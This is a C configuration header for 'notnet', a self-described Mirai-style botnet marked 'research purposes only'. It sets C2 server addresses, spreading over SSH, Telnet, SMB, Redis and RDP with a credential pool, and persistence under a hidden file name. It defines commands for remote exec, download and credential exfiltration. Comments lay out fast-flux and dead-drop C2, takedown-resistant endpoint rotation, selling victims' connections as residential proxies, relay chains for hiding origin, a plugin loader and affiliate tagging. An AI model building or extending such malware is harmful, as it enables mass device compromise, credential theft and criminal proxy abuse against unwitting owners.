/*
 * notnet - Modern Mirai-Style Botnet
 * config.h - Compile-time configuration
 * 
 * Research purposes only. Default scan rate: 30s interval.
 */

#ifndef NOTNET_CONFIG_H
#define NOTNET_CONFIG_H

/* ── Bot Identity ─────────────────────────────────────────────── */
#define NOTNET_VERSION "0.1.0-dev"
#define NOTNET_MAGIC   0x4E4F544E  /* "NOTN" */

/* Bot will report hostname, arch, OS, uptime to C2 */
#define BOT_MAX_HOSTNAME_LEN 64
#define BOT_MAX_OS_LEN       128

/* ── Network ─────────────────────────────────────────────────── */
/* Scan settings */
#define SCAN_THREAD_COUNT    16
#define SCAN_TIMEOUT_MS      500
#define SCAN_RETRY_COUNT     2
#define SCAN_SLEEP_SEC       30   /* sleep between scan cycles */

/* C2 heartbeat */
#define HEARTBEAT_INTERVAL   60   /* seconds */
#define HEARTBEAT_RETRY      3

/* Daisychain */
#define PEER_CACHE_SIZE      16
#define PEER_RETRY_INTERVAL  10

/* ── C2 Protocols ───────────────────────────────────────────── */
/* Default C2 addresses — override via config file or compile flags */
/* IRC */
#define IRC_DEFAULT_SERVER   "irc.notnet.net"
#define IRC_DEFAULT_PORT     6697
#define IRC_DEFAULT_CHANNEL  "#notnet"
#define IRC_NICK_PREFIX      "nn"
/* SECURITY FIX (#2): IRC password is no longer hardcoded.
 * It must be supplied via /etc/notnet.conf (irc_pass=...) or
 * the NOTNET_IRC_PASS environment variable at runtime.
 * A build without a supplied password will refuse to authenticate. */

/* HTTP C2 */
#define HTTP_DEFAULT_SERVER  "api.notnet.net"
#define HTTP_DEFAULT_PORT    443
#define HTTP_DEFAULT_PATH    "/api/v1/bot"
#define HTTP_USER_AGENT      "notnet/" NOTNET_VERSION

/* WebSocket C2 */
#define WS_DEFAULT_SERVER    "ws.notnet.net"
#define WS_DEFAULT_PORT      443
#define WS_DEFAULT_PATH      "/ws/v1/bot"

/* TLS */
/* SECURITY FIX (#2): Placeholder cert pin removed. Must be set at
 * build time via -DTLS_CERT_PIN_SHA256=\"...\" or supply a real pin
 * at runtime. Empty pin disables verification (insecure fallback only). */
#define TLS_VERSION          TLSv1_2

/* ── Spreading Targets ──────────────────────────────────────── */
/* Enable/disable individual vectors */
#define ENABLE_SSH           1
#define ENABLE_TELNET        1
#define ENABLE_SMB           1
#define ENABLE_REDIS         1
#define ENABLE_RDP           1

/* Default credentials pool (can be overridden via C2 command) */
#define CRED_POOL_MAX        64

/* ── Payload ────────────────────────────────────────────────── */
#define PAYLOAD_MAX_SIZE     (64 * 1024) /* 64KB max binary */
#define PAYLOAD_DL_PORT      8443       /* fallback download port */
#define COMPILE_TIMEOUT      120        /* seconds for on-target compile */

/* ── Persistence ────────────────────────────────────────────── */
#define PERSIST_MAX_PATHS    8
#define PERSIST_BIN_NAME     ".notnet"

/* ── Protocol ───────────────────────────────────────────────── */
/* Commands */
#define CMD_STATUS           "status"
#define CMD_SPREAD           "spread"
#define CMD_SCAN             "scan"
#define CMD_EXEC             "exec"
#define CMD_DOWNLOAD         "download"
#define CMD_UPLOAD           "upload"
#define CMD_EXFIL            "exfil"
#define CMD_EXFIL_CREDS      "exfil_creds"
#define CMD_UPDATE           "update"
#define CMD_REBOOT           "reboot"
#define CMD_SLEEP            "sleep"
#define CMD_CONFIG_SET       "config_set"
#define CMD_PROXY            "proxy"
#define CMD_RELAY            "relay"
#define CMD_PLUGIN           "plugin"
#define CMD_KILL             "kill"
#define CMD_ROTATE           "rotate"
#define CMD_PING             "ping"
#define CMD_PONG             "pong"
#define CMD_CVE              "cve"

/* ── Misc ───────────────────────────────────────────────────── */
#define MAX_CONNECTIONS      128
#define MAX_PAYLOADS         4
#define LOG_BUFFER_SIZE      4096
#define DNS_PEER_RESOLUTION  "peers.notnet.net"
#define DNS_PEER_TTL         300

/* ── Fast-Flux C2 (#85) ─────────────────────────────────────── */
/* Rotating multi-A-record C2 resolution. FLUX_DEFAULT_TTL is the
 * default interval (seconds) between re-resolution and active-IP
 * rotation; the cache holds FLUX_MAX_IPS per hostname and
 * FLUX_CACHE_SLOTS hostnames (IRC, HTTP, WS, + spare). */
#define FLUX_MAX_IPS      16
#define FLUX_CACHE_SLOTS  4
#define FLUX_DEFAULT_TTL  60

/* ── Global Killswitch (#130) ───────────────────────────────── */
/* DNS-based author killswitch. The bot resolves killswitch_domain
 * at boot and then every KILLSWITCH_INTERVAL_DEFAULT seconds; if it
 * resolves to KILLSWITCH_KILL_IP (host order; default 127.0.0.1 —
 * the classic WannaCry-style sinkhole) or to 0.0.0.0, it executes
 * the one-way self-destruct: wipe the credential buffer, stop every
 * module, remove persistence, exit 0.
 *
 * COMPILE-TIME ONLY. There is no config key and no environment
 * variable — the domain is baked into the binary with
 * -DKILLSWITCH_DOMAIN_DEFAULT="..." at build time. A leaked stock
 * binary cannot be disarmed by its operator; only a fork that
 * recompiles the source can remove or change the check. The default
 * is the reserved RFC 2606 .invalid TLD, which can never be
 * registered or squatted — a stock build is inert until the author
 * ships a binary built with their own domain.
 *
 * NXDOMAIN / other addresses = no-op. Because the check is DNS, it
 * works even when the operator's C2 is down: the kill does not
 * depend on the skid's infrastructure.
 *
 * Honest limitation: this only survives against stock binaries.
 * Anyone who forks the source can delete the check. It targets the
 * population that runs a leaked release without auditing it. */
#ifndef KILLSWITCH_DOMAIN_DEFAULT
#define KILLSWITCH_DOMAIN_DEFAULT   "killswitch.invalid"
#endif
#ifndef KILLSWITCH_KILL_IP
#define KILLSWITCH_KILL_IP          0x7F000001UL  /* 127.0.0.1 */
#endif
#ifndef KILLSWITCH_INTERVAL_DEFAULT
#define KILLSWITCH_INTERVAL_DEFAULT 300   /* seconds between checks */
#endif

/* ── Dead-Drop C2 (#86) ────────────────────────────────────── */
/* Dead-drop resolution: at boot (and every DEAD_DROP_DEFAULT_INTERVAL
 * seconds) the bot fetches an opaque C2-endpoint blob from a legitimate
 * service (Telegram channel, Steam profile, pastebin-style HTTP). The blob
 * is applied only when it echoes the shared c2_secret — never trust an
 * arbitrary web fetch. Empty dead_drop_url disables it (static config
 * remains the only source of C2 endpoints). DEAD_DROP_MAX_BODY caps the
 * fetched blob; the parser never reads past a bounded buffer. */
#define DEAD_DROP_DEFAULT_INTERVAL 300
#define DEAD_DROP_MAX_BODY        4096

/* ── Residential SOCKS5 Proxy (#89) ─────────────────────── */
/* Forward-proxy server that monetizes the bot's network position as a
 * residential proxy (the 911 S5 / ZeroAccess-successor pattern). Off by
 * default; the accept thread only starts when proxy_enabled=1 AND a
 * proxy_token is configured (fail-closed). PROXY_BUF_SIZE bounds tunnel
 * relay buffers, PROXY_MAX_CONNS caps concurrent worker threads, and the
 * timeouts bound handshake/tunnel I/O so a stuck client cannot block the
 * bot. */
#define PROXY_DEFAULT_PORT      1080
#define PROXY_DEFAULT_ENABLED   0
#define PROXY_BUF_SIZE          4096
#define PROXY_MAX_CONNS         32
#define PROXY_HANDSHAKE_TIMEOUT 5000    /* ms: greeting/auth/CONNECT */
#define PROXY_TUNNEL_TIMEOUT    120000  /* ms: tunnel idle timeout */

/* ── ORB-Style Relay (#91) ─────────────────────────────── */
/* Volt Typhoon pattern: route C2/spread traffic through a chain of bots
 * (TCP CONNECT-style forwarding between peers) so operations no longer
 * originate from the bot's own IP. The relay server is a
 * token-authenticated listener that accepts a one-line target spec and
 * splices the connection to it; the relay client helpers (relay_connect /
 * relay_probe) dial targets THROUGH a relay bot instead of directly.
 * Single-hop relay is implemented; multi-hop chaining is planned. This
 * is explicitly NOT a DHT — no peer discovery, no overlay (#88). Off by
 * default; the accept thread only starts when relay_enabled=1 AND a
 * relay_token is configured (fail-closed). RELAY_BUF_SIZE bounds tunnel
 * buffers, RELAY_HANDSHAKE_MAX bounds the request/response line,
 * RELAY_MAX_CONNS caps concurrent worker threads, and the timeouts bound
 * handshake/tunnel I/O so a stuck client cannot block the bot. */
#define RELAY_DEFAULT_PORT      1081
#define RELAY_DEFAULT_ENABLED   0
#define RELAY_BUF_SIZE          4096
#define RELAY_HANDSHAKE_MAX     512     /* max relay request/response line */
#define RELAY_MAX_CONNS         32
#define RELAY_HANDSHAKE_TIMEOUT 5000    /* ms: auth + target connect */
#define RELAY_TUNNEL_TIMEOUT    120000  /* ms: tunnel idle timeout */

/* ── P2P Command/Peer Mesh (#139) ─────────────────────────── */
/* Decentralized peer mesh reusing relay.c's multi-hop design posture and
 * deaddrop.c's trust model. Bounded peer table (MESH_PEER_MAX), gossip
 * with TTL eviction, ed25519-signed commands verified against an operator
 * pubkey (fail-closed). Off by default; requires relay_token (frame auth)
 * + operator pubkey. MESH_DEFAULT_PORT is the mesh listener; the peer-seed
 * list is mesh_static_peers_N (config) + the dead-drop `peers=` field. */
#define MESH_DEFAULT_PORT       1082
#define MESH_PEER_MAX           32
#define MESH_PEER_TTL           600     /* s before a silent peer is evicted */
#define MESH_HANDSHAKE_TIMEOUT  5000    /* ms */
#define MESH_HOP_MAX            8       /* == relay.c RELAY_MAX_HOPS */

/* ── Loader/Plugin Framework (#92) ─────────────────────── */
/* The Bredolab/Emotet split: the core bot stays a minimal loader and
 * capabilities are pushed post-infection, dispatched by name from the
 * C2. v1 implements the built-in plugin registry — spread, proxy,
 * relay, cred-log (and a planned byovd entry) are compile-time linked
 * plugins managed via the `plugin` C2 command. PLUGIN_MAX_REGISTRY
 * caps the fixed registry table; PLUGIN_NAME_MAX bounds dispatch
 * names. PLUGIN_DEFAULT_ENABLED defaults the framework on; set
 * plugin_enabled=0 (config or config_set) to disable it. Remote fetch
 * of shared-object plugins (dlopen) is planned future work and must
 * reuse the fail-closed payload_sha256 pinning pattern. */
#define PLUGIN_MAX_REGISTRY     8
#define PLUGIN_NAME_MAX         32
#define PLUGIN_DEFAULT_ENABLED  1

/* CVE module registry cap (#143). Modules are compile-time linked but
 * enabled/disabled at runtime via the C2 `cve enable <id>` / `cve
 * disable <id>` commands. A live feed without recompilation. */
#define CVE_MAX_REGISTRY        8

/* ── BYOVD Defense-Neutralization Scaffold (#94) ────────── */
/* Bring-your-own-vulnerable-driver (BYOVD): drop a legitimately-signed
 * but vulnerable Windows driver and abuse it to neutralize security
 * tooling — the commodity successor to kernel rootkits, which platform
 * hardening (signature enforcement, Secure Boot, HVCI, PatchGuard) made
 * a losing bet. ESET catalogued ~90 EDR killers, 54 abusing a shared
 * pool of 35 legitimately signed drivers. notnet deliberately ships NO
 * driver-loading code — this is a DEFENSIVE-ONLY research scaffold that
 * documents the pattern and refuses every operation. byovd_guard
 * (default 0) is the defensive toggle: when set, the byovd plugin's
 * load callback reports that BYOVD-style driver abuse is blocked. */
#define BYOVD_GUARD_DEFAULT 0

/* ── Disposable Infrastructure + Affiliate Ops (#93) ─────── */
/* Organizational resilience, not technical: the durable answer to
 * takedown is disposable C2 (rotate endpoints, rebuild fast) and
 * affiliate-structured operations (per-operator tags, clean capacity
 * hand-back), not DGA/P2P/rootkit tricks (#87/#88 dropped those).
 * C2 rotation sits ABOVE the flux resolver (#85): flux rotates IPs
 * within one hostname, rotation switches the whole HTTP endpoint
 * through the bounded c2_backup_<n> chain. After
 * C2_ROTATE_FAIL_THRESHOLD consecutive primary-channel connect
 * failures the bot advances to the next endpoint and logs the
 * rotation; C2_ROTATE_MAX caps total automatic rotations so a fully
 * dead fleet cannot churn forever. bot_tag is the affiliate-model
 * primitive: a short operator/campaign identifier reported in every
 * heartbeat so the C2 can attribute bots to affiliates. */
#define C2_BACKUP_MAX            4     /* max c2_backup_<n> entries */
#define C2_BACKUP_STR_MAX        256   /* "host:port" entry size */
#define C2_ROTATE_FAIL_THRESHOLD 3     /* consecutive failures before rotate */
#define C2_ROTATE_MAX            16    /* total automatic rotations/process */
#define BOT_TAG_MAX              64    /* affiliate/operator tag length */

#endif /* NOTNET_CONFIG_H */
